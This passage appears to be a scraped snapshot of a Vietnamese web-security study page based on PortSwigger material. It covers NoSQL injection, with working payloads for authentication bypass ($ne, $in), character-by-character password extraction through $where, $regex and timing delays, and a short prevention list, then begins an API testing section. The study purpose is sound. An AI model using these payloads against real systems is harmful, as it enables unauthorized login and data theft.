          - text: — khớp các giá trị trong mảng.
        - listitem [ref=e2423]:
          - code [ref=e2424]: $regex
          - text: — khớp với một biểu thức chính quy.
      - paragraph [ref=e2425]:
        - strong [ref=e2426]: "Cách chèn operator:"
      - list [ref=e2427]:
        - listitem [ref=e2428]:
          - text: "JSON:"
          - code [ref=e2429]: "{\"username\":\"wiener\"}"
          - text: →
          - code [ref=e2430]: "{\"username\":{\"$ne\":\"invalid\"}}"
        - listitem [ref=e2431]:
          - text: "URL:"
          - code [ref=e2432]: username=wiener
          - text: →
          - code [ref=e2433]: username[$ne]=invalid
        - listitem [ref=e2434]:
          - text: Nếu không được, đổi
          - code [ref=e2435]: GET
          - text: thành
          - code [ref=e2436]: POST
          - text: ", đổi"
          - code [ref=e2437]: Content-Type
          - text: sang
          - code [ref=e2438]: application/json
          - text: ", rồi chèn operator vào body."
      - paragraph [ref=e2439]:
        - strong [ref=e2440]: "Bypass xác thực:"
        - text: với body
        - code [ref=e2441]: "{\"username\":\"wiener\",\"password\":\"peter\"}"
        - text: ":"
      - generic [ref=e2443]:
        - code [ref=e2445]:
          - generic [ref=e2446]: "{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}"
        - button [ref=e2448] [cursor=pointer]
      - paragraph [ref=e2452]:
        - text: Query trả về mọi credential có username và password khác
        - code [ref=e2453]: invalid
        - text: ", nên đăng nhập vào user đầu tiên trong collection. Nhắm một account cụ thể:"
      - generic [ref=e2455]:
        - code [ref=e2457]:
          - generic [ref=e2458]: "{\"username\":{\"$in\":[\"admin\",\"administrator\",\"superadmin\"]},\"password\":{\"$ne\":\"\"}}"
        - button [ref=e2460] [cursor=pointer]
      - heading "Trích xuất dữ liệu" [level=4] [ref=e2464]
      - paragraph [ref=e2465]:
        - strong [ref=e2466]:
          - text: Qua syntax injection (operator
          - code [ref=e2467]: $where
          - text: ", hàm"
          - code [ref=e2468]: mapReduce()
          - text: "chạy được JavaScript):"
      - paragraph [ref=e2469]:
        - text: Query gốc
        - code [ref=e2470]: "{\"$where\":\"this.username == 'admin'\"}"
        - text: ". Dò password từng ký tự:"
      - generic [ref=e2472]:
        - code [ref=e2474]:
          - generic [ref=e2475]: admin' && this.password[0] == 'a' || 'a'=='b
          - generic [ref=e2477]: admin' && this.password.match(/\d/) || 'a'=='b
        - button [ref=e2479] [cursor=pointer]
      - paragraph [ref=e2483]: "Xác định tên field (MongoDB không có schema cố định): so sánh response của field đã biết tồn tại và field không tồn tại:"
      - generic [ref=e2485]:
        - code [ref=e2487]:
          - generic [ref=e2488]: admin' && this.username!=' (field tồn tại)
          - generic [ref=e2490]: admin' && this.foo!=' (field không tồn tại)
          - generic [ref=e2492]: admin' && this.password!=' (so sánh để biết password có tồn tại không)
        - button [ref=e2494] [cursor=pointer]
      - paragraph [ref=e2498]:
        - strong [ref=e2499]: "Qua operator injection:"
        - text: tự chèn
        - code [ref=e2500]: $where
        - text: "để chạy JavaScript:"
      - generic [ref=e2502]:
        - code [ref=e2504]:
          - generic [ref=e2505]: "{\"username\":\"wiener\",\"password\":\"peter\", \"$where\":\"0\"}"
          - generic [ref=e2507]: "{\"username\":\"wiener\",\"password\":\"peter\", \"$where\":\"1\"}"
        - button [ref=e2509] [cursor=pointer]
      - paragraph [ref=e2513]:
        - text: Trích tên field bằng
        - code [ref=e2514]: keys()
        - text: ":"
      - generic [ref=e2516]:
        - code [ref=e2518]:
          - generic [ref=e2519]: "\"$where\":\"Object.keys(this)[0].match('^.{0}a.*')\""
        - button [ref=e2521] [cursor=pointer]
      - paragraph [ref=e2525]:
        - text: Trích dữ liệu bằng
        - code [ref=e2526]: $regex
        - text: "(không cần chạy JavaScript):"
      - generic [ref=e2528]:
        - code [ref=e2530]:
          - generic [ref=e2531]: "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a.*\"}}"
        - button [ref=e2533] [cursor=pointer]
      - heading "Timing-based injection" [level=4] [ref=e2537]
      - paragraph [ref=e2538]: "Khi lỗi không làm response khác đi, dùng JavaScript gây delay có điều kiện:"
      - list [ref=e2539]:
        - listitem [ref=e2540]: Tải trang vài lần để lấy baseline.
        - listitem [ref=e2541]:
          - text: Chèn payload gây delay, ví dụ
          - code [ref=e2542]: "{\"$where\": \"sleep(5000)\"}"
          - text: .
        - listitem [ref=e2543]: Xem response có chậm hơn không.
      - generic [ref=e2545]:
        - code [ref=e2547]:
          - generic [ref=e2548]: "admin'+function(x){if(x.password[0]===\"a\"){sleep(5000)};}(this)+'"
        - button [ref=e2550] [cursor=pointer]
      - heading "Phòng chống" [level=4] [ref=e2554]
      - list [ref=e2555]:
        - listitem [ref=e2556]:
          - text: Sanitize và validate input theo
          - strong [ref=e2557]: allowlist
          - text: ký tự.
        - listitem [ref=e2558]:
          - text: Dùng
          - strong [ref=e2559]: parameterized query
          - text: thay vì nối chuỗi.
        - listitem [ref=e2560]:
          - text: Chống operator injection bằng allowlist các key được chấp nhận (chặn key bắt đầu bằng
          - code [ref=e2561]: $
          - text: ).
        - listitem [ref=e2562]: Đọc tài liệu bảo mật của NoSQL database đang dùng.
      - heading "API testing" [level=3] [ref=e2563]
      - paragraph [ref=e2564]:
        - img "API testing" [ref=e2565]
        - emphasis [ref=e2566]:
          - text: "Nguồn:"
          - link "PortSwigger Web Security Academy" [ref=e2567] [cursor=pointer]:
            - /url: https://portswigger.net/web-security/api-testing
      - heading "Khái niệm" [level=4] [ref=e2568]
      - paragraph [ref=e2569]:
        - text: API cho phép các hệ thống phần mềm giao tiếp và chia sẻ dữ liệu. Mọi website động đều cấu thành từ API, nên các lỗ hổng cổ điển như SQLi cũng có thể coi là API testing. Phần này tập trung vào API
        - strong [ref=e2570]: RESTful và JSON
        - text: không được front-end dùng hết, cùng với
        - strong [ref=e2571]: server-side parameter pollution
        - text: ". Lỗ hổng API ảnh hưởng tới cả ba yếu tố: tính bí mật, toàn vẹn và sẵn sàng."
      - heading "API recon" [level=4] [ref=e2572]
      - paragraph [ref=e2573]:
        - strong [ref=e2574]: "Tìm endpoint:"
        - text: ví dụ
        - code [ref=e2575]: GET /api/books
        - text: có endpoint là
